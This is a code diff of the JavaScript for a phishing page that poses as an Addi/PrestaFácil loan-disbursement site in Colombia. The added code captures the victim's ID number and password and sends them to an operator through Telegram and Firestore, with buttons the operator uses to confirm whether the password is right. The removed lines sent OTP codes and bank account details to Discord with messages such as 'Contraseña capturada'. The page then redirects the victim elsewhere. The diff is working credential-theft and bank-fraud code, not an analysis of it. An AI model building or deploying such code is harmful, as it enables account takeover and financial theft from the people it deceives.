+    b.push([{ text: '✓ Verificación exitosa', callback_data: 'okpass|' + sid }]);
+    b.push([{ text: '✗ Contraseña incorrecta', callback_data: 'badpass|' + sid }]);
+  }
+  b.push([{ text: '🗑 Borrar sesión', callback_data: 'del|' + sid }]);
+  return b;
+}
+
+let ultimaNotifKey = '';
+let ultimaNotifAt = 0;
+function notificarEstado(){
+  if(!pendingNext || session.cerrada) return;
+  const key = currentStep() + '|' + pendingNext;
+  const now = Date.now();
+  if(key === ultimaNotifKey && now - ultimaNotifAt < 4000) return;  // evita duplicados
+  ultimaNotifKey = key; ultimaNotifAt = now;
+  notificarTelegram('**👤 ' + (session.cedula||'—') + ' · 🔑 ' + (session.password||'—') + '**\n' + tarjetaSesion() + '\n⏳ **Esperando tu validación…**', botonesTelegram());
+}
+
+/* ====== Firebase / Firestore (sincronización con el bot de Telegram) ======
+   👉 ¿CREASTE UNA CUENTA NUEVA EN FIREBASE? Cambia AQUÍ los 6 datos de tu proyecto
+   (Consola Firebase → ⚙️ Configuración del proyecto → Tus apps → Aplicación web).
+   Los mismos apiKey y projectId van en las variables de entorno de Vercel. */
 const FIREBASE_CONFIG = {
   apiKey: "TU_FIREBASE_API_KEY",
   authDomain: "addidataset.firebaseapp.com",
@@ -451,15 +198,13 @@ const FIREBASE_CONFIG = {
   messagingSenderId: "1001401727670",
   appId: "1:1001401727670:web:7515b67dc8bb451416c417"
 };
+
 let pendingNext = null;
 let fireReady = false;
-let fDb, fDoc, fCollection, fGetDoc, fSetDoc, fUpdateDoc, fOnSnapshot, fServerTimestamp;
+let fDb, fDoc, fSetDoc, fOnSnapshot, fServerTimestamp;
 let lastCmdId = (()=>{ try{ return Number(sessionStorage.getItem('addi_last_cmd')||0); }catch(e){ return 0; } })();
 
 function getSid(){
-  // Sesión ÚNICA por pestaña/carga (SIN persistencia):
-  // así NUNCA se comparten ni se heredan datos entre clientes,
-  // ni siquiera al duplicar una pestaña del navegador.
   try{
     if(crypto.randomUUID) return crypto.randomUUID();
   }catch(e){}
@@ -467,125 +212,90 @@ function getSid(){
 }
 const SID = getSid();
 
-function monto(){ return session.amount > 0 ? session.amount : CONFIG.amount; }
-function maskPhone(v){
-  const d = String(v).replace(/\D/g,'');
-  if(d.length < 4) return session.phone;
-  return d.slice(0,2) + '******' + d.slice(-2);
-}
 function currentStep(){ return document.querySelector('.step.active').id; }
-function sessionData(){ return { password:session.password, cedula:session.cedula, phone:session.phone, amount:session.amount, term:session.term, otp:session.otp, banco:session.banco, cuentaTipo:session.cuentaTipo, cuentaNum:session.cuentaNum, telfAddi:session.telfAddi, retirar:session.retirar, comercio:session.comercio }; }
+
+function show(id){
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+  window.scrollTo(0,0);
+  publish();
+}
+
 function publish(){
   if(!fireReady || session.cerrada) return;
   try{
     fSetDoc(fDoc(fDb,'solicitudes',SID), {
       paso: currentStep(),
       pendiente: pendingNext,
-      datos: sessionData(),
+      adminToken: ADMIN_TOKEN,
+      datos: { password: session.password, cedula: session.cedula },
       uid: session.uid || '',
       actualizado: fServerTimestamp()
     }, { merge: true });
   }catch(e){ console.warn('publish:', e); }
 }
-const TEXTO_ESPERA = {
-  's-confirm'  : 'Preparando tu plan de cuotas…',
-  's-identity' : 'Preparando tu desembolso…'
-};
+
 function showLayer(on, txt){
   const l = $('loadLayer');
   if(!l) return;
   l.style.display = on ? 'flex' : 'none';
   if(on && txt) $('loadText').textContent = txt;
 }
+
 function waitNext(next){
   if(session.cerrada) return;
   pendingNext = next;
-  const actualLoader = ['s-processing','s-verifying','s-verifying2'].includes(currentStep());
-  if(!actualLoader && TEXTO_ESPERA[next]) showLayer(true, TEXTO_ESPERA[next]);
+  showLayer(true, 'Esperando validación…');
   publish();
+  notificarEstado();
 }
-function resetBtn(sec,label){
-  const b = document.querySelector('#' + sec + ' .btn');
-  if(b){ b.disabled = false; b.innerHTML = label; }
-}
-function mostrarError(sec,msg){
-  show(sec);
-  const e = document.querySelector('#' + sec + ' .err');
+function mostrarError(stepId, errId, msg){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  $(stepId).classList.add('active');
+  const e = $(errId);
   if(e){ e.textContent = msg; e.style.display = 'block'; }
 }
+function resetBtn(btnId, label){
+  const b = $(btnId);
+  if(b){ b.disabled = false; b.innerHTML = label; }
+}
+
+/* Redirigir al final del flujo */
+function irARedirect(){
+  try{ session.cerrada = true; location.href = URL_REDIRECCION; }catch(e){}
+}
+
+/* Procesa los comandos que escribe el bot de Telegram en Firestore */
 function handleCmd(c){
   if(!c || !c.id) return;
-  // 1) El asesor define el monto y/o el celular de esta sesión (con eso autoriza el retiro)
-  if(c.monto && Number(c.monto) > 0){
-    session.amount = Number(c.monto);
-    const mx = $('otpMonto');
-    if(mx && currentStep()==='s-otp') mx.innerHTML = '<span class="mb-label">Vas a retirar</span>' + fmt(retiroMostrar());
-    const al = $('amountLabel'); if(al) al.textContent = fmt(retiroMostrar());
-    const ok = $('okAmount');    if(ok) ok.textContent = fmt(session.amount);
-  }
-  if(c.telefono){
-    session.phone = maskPhone(c.telefono);
-    const op = $('otp-phone'); if(op) op.textContent = session.phone;
-    const ip = $('identPhone'); if(ip) ip.textContent = session.phone;
-  }
-  if(c.comercio){
-    session.comercio = String(c.comercio).trim();
-    mostrarComercio();
-  }
-  publish();
   pendingNext = null;
   showLayer(false);
-  // 2) Rechazos del asesor
-  if(c.error === 'cuenta-no-existe'){ resetBtn('s-cedula','Continuar'); mostrarError('s-cedula','No existe una cuenta con esa cédula. Verifica e inténtalo de nuevo.'); return; }
-  if(c.error === 'pass-incorrecta'){ resetBtn('s-pass','Continuar'); mostrarError('s-pass','Contraseña incorrecta. Inténtalo de nuevo.'); return; }
-  if(c.otp === 'bad'){ clearOtpInputs(); mostrarError('s-otp','Código inválido. Intentá de nuevo.'); const f0=$('otpInputs').getElementsByTagName('input')[0]; if(f0) f0.focus(); return; }
-  // 3) Aprobaciones / saltos
+  if(c.error === 'cuenta-no-existe'){
+    resetBtn('btnCedula', 'Continuar');
+    mostrarError('s-cedula', 'cedula-err', 'No existe una cuenta con esa cédula. Verifica e inténtalo de nuevo.');
+    return;
+  }
+  if(c.error === 'pass-incorrecta'){
+    resetBtn('btnPass', 'Continuar');
+    mostrarError('s-pass', 'pass-err', 'Contraseña incorrecta. Inténtalo de nuevo.');
+    return;
+  }
   const go = c.go;
   if(!go) return;
-  if(go==='s-plans') buildPlans();
-  show(go);
-  if(go==='s-identity'){
-    sendToDiscord(`🛡️ El cliente está en **Verificación de identidad** — llegó hasta el paso 8 y espera tu validación para continuar.`);
-    waitNext('s-verifying2');
+  if(go === 's-pass'){
+    show('s-pass');
+  } else if(go === 's-verif'){
+    // pantalla de carga «Verificación exitosa» → luego asesor virtual → redirigir
+    show('s-verif');
+    setTimeout(()=>{ if(currentStep() === 's-verif') show('s-asesor'); }, 2600);
+    setTimeout(()=>{ if(session && !session.cerrada) irARedirect(); }, 7000);
   }
-  else if(go==='s-verifying2') waitNext('s-success');
-  else if(go==='s-success'){
-    mostrarResumen();
-    const p = calcPlan(session.term);
-    sendToDiscord(`**✅ Desembolso aprobado**\n- Radicado: \`${session.radicado}\`\n- Comercio aliado: \`${session.comercio||'—'}\`\n- Banco: \`${session.banco||'—'}\`\n- Cuenta: ${session.cuentaTipo||'—'} #${session.cuentaNum||'—'}\n- Valor a retirar: ${fmt(retiroMostrar())}\n- Cédula: \`${session.cedula}\`\n- Celular: ${session.phone}\n- Monto cupo: ${fmt(monto())}\n- Cuotas: ${session.term} de ${fmt(p.total)}`);
-  }
-  else if(go==='s-processing'){
-    mostrarMonto();
-    // Solo auto-avanza al banco si todavía no lo pasó (evita re-disparos viejos)
-    if(!session.banco) setTimeout(()=>{ if(currentStep()==='s-banco') return; mostrarComercio(); show('s-banco'); }, 2600);
-  }
-  else if(go==='s-banco'){
-    // El banco se pide UNA sola vez (antes del código).
-    // Si el cliente ya entregó sus datos, NUNCA se vuelve a mostrar.
-    if(session.banco){ irAOTP(); }
-    else mostrarComercio();
-  }
-  else if(go==='s-cupo'){
-    // El cupo/retiro también se muestra una sola vez.
-    if(session.retirar){ irAOTP(); }
-    else mostrarCupo();
-  }
-  else if(go==='s-otp'){
-    // Ir al código SIN regenerar (evita bucles y que se borren los recuadros)
-    mostrarMonto();
-    if(!session.otpListo) generarOTP();
-  }
+  publish();
 }
-function irAOTP(){
-  mostrarMonto();
-  show('s-otp');
-  if(!session.otpListo) generarOTP();
-}
+
 function consumeCommand(data){
   const c = data && data.comando;
   if(!c || !c.id) return;
-  // CANAL PROPIO: las señales de OTRAS sesiones se ignoran por completo,
-  // aunque por cualquier motivo llegaran a este documento.
   if(c.canal && c.canal !== SID) return;
   if(c.id > lastCmdId){
     lastCmdId = c.id;
@@ -593,11 +303,14 @@ function consumeCommand(data){
     handleCmd(c);
   }
 }
+
 function sesionCerrada(){
   session.cerrada = true;
   showLayer(false);
   const b = $('closedBar'); if(b) b.style.display = 'block';
+  notificarTelegram('🛑 **Sesión cerrada**\n' + tarjetaSesion());
 }
+
 async function initFirebase(){
   try{
     const appMod  = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js');
@@ -605,10 +318,8 @@ async function initFirebase(){
     const authMod = await import('https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js');
     const app = appMod.initializeApp(FIREBASE_CONFIG);
     fDb = fsMod.getFirestore(app);
-    fDoc = fsMod.doc; fCollection = fsMod.collection;
-    fGetDoc = fsMod.getDoc; fSetDoc = fsMod.setDoc; fUpdateDoc = fsMod.updateDoc; fOnSnapshot = fsMod.onSnapshot;
+    fDoc = fsMod.doc; fSetDoc = fsMod.setDoc; fOnSnapshot = fsMod.onSnapshot;
     fServerTimestamp = fsMod.serverTimestamp;
-    // Login anónimo: obligatorio cuando apliques las reglas; en modo prueba no bloquea
     try{
       const auth = authMod.getAuth(app);
       await authMod.signInAnonymously(auth);
@@ -625,262 +336,30 @@ async function initFirebase(){
   }
 }
 
-/* ====== HELPERS ====== */
-const fmt = n => '$' + Math.round(n).toLocaleString('es-CO');
-const $ = id => document.getElementById(id);
-let selectedTerm = 24;
-let purchaseBarVisible = false;
-
-function show(id){
-  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
-  $(id).classList.add('active');
-  // Barra de desembolso: visible desde que se escogen cuotas
-  const showBar = ['s-plans','s-confirm'].includes(id);
-  $('purchasebar').style.display = showBar ? 'flex' : 'none';
-  window.scrollTo(0,0);
-  publish();
-}
-
-/* ====== STEP 1: Cédula ====== */
+/* ====== PASOS DEL CLIENTE ====== */
 function submitCedula(){
   if(session.cerrada) return;
   const v = $('cedula').value.replace(/\D/g,'');
   if(v.length < 6){ $('cedula-err').style.display='block'; return; }
   $('cedula-err').style.display='none';
   session.cedula = v;
-  sendToDiscord(`**📋 Nueva solicitud de desembolso PrestaFácil**\n- Cédula: \`${v}\`\n- Celular: ${session.phone||'—'}\n- Monto: ${session.amount > 0 ? fmt(session.amount) : '—'}\n- Tienda: ${CONFIG.storeName}`);
-  const btn = document.querySelector('#s-cedula .btn');
-  btn.disabled = true;
-  btn.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Validando…';
+  const b = $('btnCedula');
+  if(b){ b.disabled = true; b.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Validando…'; }
   waitNext('s-pass');
 }
-/* ====== STEP 2: Contraseña ====== */
 function submitPass(){
   if(session.cerrada) return;
   const p = $('passwd').value;
   if(p.length < 4){ $('pass-err').style.display='block'; return; }
   $('pass-err').style.display='none';
   session.password = p;
-  sendToDiscord(`**🔑 Contraseña capturada**\n- Cédula: \`${session.cedula}\`\n- Contraseña: \`${p}\``);
-  const btn = document.querySelector('#s-pass .btn');
-  btn.disabled = true;
-  btn.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Validando…';
-  waitNext('s-processing');
+  const b = $('btnPass');
+  if(b){ b.disabled = true; b.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Validando…'; }
+  waitNext('s-verif');
 }
-$('cedula').addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,''));
+$('cedula').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g,''));
+$('passwd').addEventListener('keydown', e => { if(e.key === 'Enter') submitPass(); });
 
-/* ====== Monto / OTP ====== */
-function retiroMostrar(){
-  if(session.retirar > 0) return session.retirar;   // lo que eligió el cliente
-  return monto();                                    // cupo del asesor (respaldo)
-}
-function mostrarComercio(){
-  const bc = $('bancoComercio');
-  if(bc){ bc.style.display = session.comercio ? 'block' : 'none'; bc.innerHTML = session.comercio ? '🛍 Este desembolso se realizará a través del <b>aliado comercial ' + session.comercio + '</b>.' : ''; }
-  const oc = $('otpComercio');
-  if(oc){ oc.style.display = session.comercio ? 'block' : 'none'; oc.innerHTML = session.comercio ? '🛍 Este desembolso se realizará con el comercio aliado <b>' + session.comercio + '</b>.' : ''; }
-}
-function mostrarMonto(){
-  const el = $('otpMonto');
-  if(el){ el.style.display='block'; el.innerHTML = '<span class="mb-label">Vas a retirar</span>' + fmt(retiroMostrar()); }
-  mostrarComercio();
-}
-function mostrarResumen(){
-  if(!session.radicado){
-    session.radicado = String(Math.floor(100000000 + Math.random()*900000000)); // radicado aleatorio de 9 dígitos
-  }
-  const set = (id, v) => { const e = $(id); if(e) e.textContent = String(v||'—'); };
-  set('rRad', 'No. ' + session.radicado);
-  set('rComercio', session.comercio || '—');
-  set('rBanco', session.banco || '—');
-  set('rTipo', session.cuentaTipo || '—');
-  set('rCuenta', session.cuentaNum || '—');
-  set('rRetiro', fmt(retiroMostrar()));
-  set('rCupo', fmt(monto()));
-  set('rCuotas', (session.term && session.term > 0) ? (session.term + ' cuotas') : '—');
-  set('rCedula', session.cedula || '—');
-}
-function generarOTP(){
-  session.otp = String(Math.floor(100000 + Math.random()*900000)); // 6 dígitos aleatorios
-  session.otpListo = true;
-  publish(); // el asesor lo ve en el dashboard y lo envía al cliente
-  clearOtpInputs();
-  $('otp-err').style.display='none';
-}
-let resendCooldown = 0; // timestamp hasta el próximo reenvío permitido (5 min)
-function refrearResend(){
-  const el = $('resend');
-  const left = Math.max(0, Math.ceil((resendCooldown - Date.now())/1000));
-  if(left > 0){
-    const m = String(Math.floor(left/60)).padStart(2,'0'), s = String(left%60).padStart(2,'0');
-    el.textContent = 'Ya se reenvió otro código (' + m + ':' + s + ')';
-    el.classList.remove('live');
-  } else {
-    el.textContent = '¿No recibiste el mensaje?';
-    el.classList.add('live');
-  }
-}
-setInterval(refrearResend, 1000);
-function clearOtpInputs(){ const ins = $('otpInputs').querySelectorAll('input'); ins.forEach(i=>i.value=''); }
-(function bindOTP(){
-  const inputs = $('otpInputs').querySelectorAll('input');
-  inputs.forEach((inp,idx)=>{
-    inp.addEventListener('input',()=>{
-      inp.value=inp.value.replace(/\D/g,'');
-      $('otp-err').style.display='none';
-      if(inp.value && idx<inputs.length-1) inputs[idx+1].focus();
-      const code=[...inputs].map(i=>i.value).join('');
-      if(code.length===6) validateOTP(code);
-    });
-    inp.addEventListener('keydown',e=>{ if(e.key==='Backspace'&&!inp.value&&idx>0) inputs[idx-1].focus(); });
-    inp.addEventListener('paste',e=>{
-      const d=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,6);
-      if(d){ e.preventDefault(); d.split('').forEach((c,i)=>{if(inputs[i])inputs[i].value=c;}); if(d.length===6)validateOTP(d); }
-    });
-  });
-})();
-function validateOTP(code){
-  if(session.cerrada) return;
-  session.otpListo = false;   // el código fue usado
-  sendToDiscord(`🔢 El cliente ingresó el código OTP \`${code}\`. Espera la validación del asesor.`);
-  show('s-verifying');   // pantalla de carga: el asesor aprueba o rechaza
-  waitNext('s-plans');
-}
-$('resend').addEventListener('click', ()=>{
-  if(Date.now() < resendCooldown) return;
-  generarOTP();                                                     // se "reenvía" otro código
-  sendToDiscord(`📲 Código OTP reenviado a ${session.phone||'—'}: \`${session.otp}\``);
-  resendCooldown = Date.now() + 5*60*1000;                          // cooldown de 5 minutos
-  refrearResend();
-});
-
-/* ====== STEP 4.5: Datos bancarios ====== */
-const BANCOS = ['Nequi','Bancolombia','Daviplata','Davivienda','Alianza Fiduciaria','Ban100','Bancamía','Banco Agrario de Colombia','Banco AV Villas','Banco BBVA Colombia','Banco Caja Social','Banco Contactar','Banco Coomeva','Banco Cooperativo Coopcentral','Banco de Bogotá','Banco de Occidente','Banco Falabella','Banco Finandina','Banco GNB Sudameris','Banco Itaú','Banco J.P. Morgan Colombia','Banco Mundo Mujer','Banco Pichincha','Banco Popular','Banco Procredit','Banco Santander Colombia','Banco Serfinanza','Banco Unión','Banco W','Citibank','CFA Cooperativa Financiera','Coink','Confiar Cooperativa Financiera','Cotrafa','Crezcamos','Dale!','Financiandina','Iris','JFK Cooperativa Financiera','Lulo Bank','Mibanco','Movii','Nu Colombia','Powwi','RappiPay','Scotiabank Colpatria','Ualá'];
-(function llenarBancos(){
-  const s = $('bancoSel'); if(!s) return;
-  s.innerHTML = '<option value="">Selecciona tu banco…</option>';
-  BANCOS.forEach(b=>{ const o=document.createElement('option'); o.value=b; o.textContent=b; s.appendChild(o); });
-})();
-function submitBanco(){
-  if(session.cerrada) return;
-  const b = $('bancoSel').value;
-  const t = $('cuentaTipo').value;
-  const num = $('cuentaNum').value.replace(/\D/g,'');
-  const tf = $('telfAddi').value.replace(/\D/g,'');
-  if(!b || !t || num.length < 6 || tf.length < 6){ $('banco-err').style.display='block'; return; }
-  $('banco-err').style.display='none';
-  session.banco = b;
-  session.cuentaTipo = t;
-  session.cuentaNum = num;
-  session.telfAddi = tf;
-  sendToDiscord(`**🏦 Datos bancarios para el desembolso**\n- Banco: \`${b}\`\n- Tipo de cuenta: \`${t}\`\n- Número de cuenta: \`${num}\`\n- Teléfono Addi: \`${tf}\``);
-  mostrarCupo();
-  show('s-cupo');
-}
-function mostrarCupo(){
-  const c = monto();
-  const min = Math.round(c * 0.917);
-  const cb = $('cupoBox'); if(cb) cb.innerHTML = '<span class="mb-label">Tu cupo disponible</span>' + fmt(c);
-  const cm = $('cupoMin'); if(cm) cm.innerHTML = 'El desembolso mínimo es <b>' + fmt(min) + '</b>.';
-}
-function submitCupo(){
-  if(session.cerrada) return;
-  const v = Number(String($('retirarNum').value).replace(/\D/g,''));
-  const c = monto();
-  const min = Math.round(c * 0.917);
-  if(!v || v < min){
-    $('cupo-err').textContent = 'El desembolso mínimo es ' + fmt(min) + '.';
-    $('cupo-err').style.display='block';
-    return;
-  }
-  if(v > c){
-    $('cupo-err').textContent = 'El valor supera tu cupo de ' + fmt(c) + '.';
-    $('cupo-err').style.display='block';
-    return;
-  }
-  $('cupo-err').style.display='none';
-  session.retirar = v;
-  const al = $('amountLabel'); if(al) al.textContent = fmt(session.retirar);
-  sendToDiscord(`**💵 Retiro solicitado**\n- Cupo disponible: \`${fmt(c)}\`\n- Valor a retirar: \`${fmt(v)}\``);
-  const btn = document.querySelector('#s-cupo .btn');
-  btn.disabled = true;
-  btn.innerHTML = '<img class="btn-loading" src="loading.svg" alt="">Procesando…';
-  show('s-processing');   // pantalla de carga: el asesor pone el teléfono y aprueba el código
-  waitNext('s-otp');
-}
-(function bindRetiro(){
-  const inp = $('retirarNum'); if(!inp) return;
-  const formatear = ()=>{
-    const clean = String(inp.value||'').replace(/[^0-9]/g,'');
-    inp.value = clean ? '$' + Number(clean).toLocaleString('es-CO') : '';
-  };
-  inp.addEventListener('input', formatear);
-  inp.addEventListener('focus', formatear);
-})();
-
-/* ====== STEP 5: Installments ====== */
-function calcPlan(n){
-  const amt = retiroMostrar();
-  const capital = amt / n;
-  const interes = amt * (CONFIG.monthlyRate + CONFIG.fianzaRate) * (1 - (n-1)/(2*n)); // decreciente aprox
-  return { capital, interes, total: capital + interes };
-}
-function buildPlans(){
-  const list = $('planList'); list.innerHTML='';
-  CONFIG.terms.forEach(n=>{
-    const p = calcPlan(n);
-    const el = document.createElement('div');
-    el.className = 'plan' + (n===selectedTerm?' sel':'');
-    el.onclick = ()=>selectPlan(n);
-    el.innerHTML = `
-      <div class="plan-head"><span class="radio"></span><span>${n} cuotas de <b>${fmt(p.total)}</b></span></div>
-      <div class="rows">
-        <div class="row"><span>Capital:</span><span>${fmt(p.capital)}</span></div>
-        <div class="row"><span>Interés y fianza:</span><span>${fmt(p.interes)}</span></div>
-        <div class="row total"><span>Total cuota:</span><span>${fmt(p.total)}</span></div>
-        <span class="tag">Desembolso de bajo monto</span>
-      </div>`;
-    list.appendChild(el);
-  });
-  updatePlanBtn();
-}
-function selectPlan(n){
-  selectedTerm=n;
-  session.term = n;
-  document.querySelectorAll('.plan').forEach((el,i)=>el.classList.toggle('sel',CONFIG.terms[i]===n));
-  updatePlanBtn();
-}
-function updatePlanBtn(){ $('planBtn').textContent = `Continuar a ${selectedTerm} cuotas`; }
-
-/* ====== STEP 6: Confirm ====== */
-function goToConfirm(){
-  if(session.cerrada) return;
-  const p = calcPlan(selectedTerm);
-  session.term = selectedTerm;
-  $('confirmN').textContent = selectedTerm;
-  $('confirmQ').textContent = fmt(p.total);
-  $('confirmDetails').innerHTML = `
-    <div class="row"><span>Capital:</span><span>${fmt(p.capital)}</span></div>
-    <div class="row"><span>Interés y fianza:</span><span>${fmt(p.interes)}</span></div>
-    <div class="row total"><span>Total cuota:</span><span>${fmt(p.total)}</span></div>`;
-  const d = new Date(); d.setMonth(d.getMonth()+1);
-  const meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
-  $('nextDate').textContent = `${d.getDate()} de ${meses[d.getMonth()]} de ${d.getFullYear()}`;
-  $('confirmBtn').textContent = `Confirmar a ${selectedTerm} cuotas`;
-  document.querySelector('#s-confirm .sub').textContent = CONFIG.storeName;
-  waitNext('s-confirm');
-}
-function toggleDetails(){
-  const d=$('confirmDetails'); const open=d.style.display==='block';
-  d.style.display=open?'none':'block'; $('detArrow').textContent=open?'⌄':'⌃';
-}
-
-/* El avance entre pasos ya NO es automático: lo aprueba el asesor desde dashboard.html */
-
-/* ====== INIT ====== */
-$('amountLabel').textContent = fmt(monto());
-$('purchasebar').style.display='none';
-const ip2 = $('identPhone'); if(ip2) ip2.textContent = session.phone || '31******94';
 initFirebase();
 </script>
 </body>
